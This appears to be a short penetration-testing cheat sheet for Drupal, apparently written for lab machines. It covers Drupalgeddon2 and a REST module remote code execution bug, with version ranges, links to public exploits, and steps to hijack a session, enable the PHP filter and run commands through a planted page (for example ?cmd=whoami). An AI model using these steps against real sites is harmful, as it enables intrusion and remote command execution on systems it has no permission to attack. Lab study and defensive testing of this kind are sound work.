# drupal

## Drupalgeddon2 (tested on v.7.56 & 7.54) should work on 7.x

< 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1

```
# php based; sudo apt install php-curl
https://www.exploit-db.com/exploits/41564
/rest
# creates two files - session.json, user.json
# use session.json, hijack session using session_name & session_id
# > Modules tab > enable PHP filter > saveM B
# > Add Content (top left) > Basic Page > 
# use php code to upload and run cmd
# example of run command: http://10.10.10.9/node/2?cmd=whoami; http://10.10.10.9/node/2?fupload=file

# ruby 
https://github.com/dreadlocked/Drupalgeddon2
sudo gem install highline
./drupalgeddon2.rb

https://www.exploit-db.com/exploits/44449
```

## REST module RCE

v <8.6.9

```
# might need to revert box / clear cache, as nodes shouldn't be cached
https://www.exploit-db.com/exploits/46459
```
